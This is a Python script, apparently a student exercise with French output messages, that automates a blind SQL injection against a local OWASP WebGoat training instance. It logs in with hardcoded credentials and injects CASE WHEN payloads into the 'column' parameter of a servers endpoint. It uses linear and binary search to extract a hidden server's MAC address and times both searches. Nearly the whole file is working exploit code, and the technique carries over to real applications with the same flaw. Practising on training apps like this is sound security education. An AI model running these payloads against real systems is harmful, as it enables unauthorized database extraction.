import requests
import time

class WebGoatBot:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.lesson = ''

    def login(self, username, password):
        login_url = self.url + '/login'
        data = {'username': username, 'password': password}

        response = self.session.post(login_url, data=data, allow_redirects=False)

        if response.status_code == 302:
            if response.headers['Location'] == self.url + '/welcome.mvc':
                return True
            else:
                return False
        else:
            return False

    def logout(self):
        logout_url = self.url + '/logout'
        response = self.session.get(logout_url)
        if response.status_code == 200:
            return True
        else:
            return False


class WebGoatBotSqlInjection(WebGoatBot):
    def __init__(self, url):
       super().__init__(url)

    def blind_sql_injection(self, query):
        encoded_query = requests.utils.quote(query) # Encode request
        response = self.session.get(self.url + '/SqlInjectionMitigations/servers?column=' + encoded_query)

        id_line = response.text.splitlines()[1]
        return id_line

    def get_mac_address(self):
        start_time = time.time()
        mac_address = ['00'] * 6
        valid_chars = '0123456789ABCDEF'

        for octet in range(6):
            found = False
            for char in valid_chars:
                for char2 in valid_chars:
                    test_mac = ':'.join(mac_address[:octet] + [f"{char}{char2}"] + ['FF'] * (5 - octet))
                    query = f"CASE WHEN ((SELECT COUNT(*) FROM servers WHERE hostname = 'webgoat-prd' and mac >= '{test_mac}') = 1) THEN id ELSE hostname END"
                    result = self.blind_sql_injection(query)

                    if result == '  "id" : "1",':
                        found = False
                    else:
                        mac_address[octet] = f"{char}{char2}"
                        found = True
                        break
                if found:
                    break
            if not found:
                return None

        end_time = time.time()
        execution_time = end_time - start_time
        return ':'.join(mac_address), execution_time

    def get_mac_by_binary_search(self):
        start_time = time.time()
        mac_address = ['00'] * 6

        for octet in range(6):
            left, right = 0, 255
            while left <= right:
                mid = (left + right) // 2
                test_mac = ':'.join(mac_address[:octet] + [f"{mid:02X}"] + ['FF'] * (5 - octet))
                query = f"CASE WHEN ((SELECT COUNT(*) FROM servers WHERE hostname = 'webgoat-prd' and mac >= '{test_mac}') = 1) THEN id ELSE hostname END"
                result = self.blind_sql_injection(query)

                if result == '  "id" : "1",':
                    # mac address is bigger, search in right side
                    left = mid + 1
                else:
                    #mac address is lower, search in left side
                    right = mid -1

            mac_address[octet] = f"{left:02X}"

        end_time = time.time()
        execution_time = end_time - start_time
        return ':'.join(mac_address), execution_time


if __name__ == "__main__":
    bot = WebGoatBotSqlInjection('http://127.0.0.1:8080/WebGoat')
    username = 'gaelle'
    password = 'azerty'
    lesson = '/SqlInjection.lesson'

    if bot.login(username, password):
        print("Connexion réussie!")

        mac_address, linear_time =  bot.get_mac_address()
        print(f"Adresse MAC : {mac_address} récupérée avec la recherche linéaire en : {linear_time:.2f} secondes")

        mac_address_binary_search, binary_time = bot.get_mac_by_binary_search()
        print(f"Adresse MAC : {mac_address_binary_search} récupérée avec la recherche binaire en : {binary_time:.2f} secondes")
    else:
        print("Échec de la connexion.")


    if bot.logout():
        print("Déconnexion réussie!")
    else:
        print("Échec de la déconnexion.")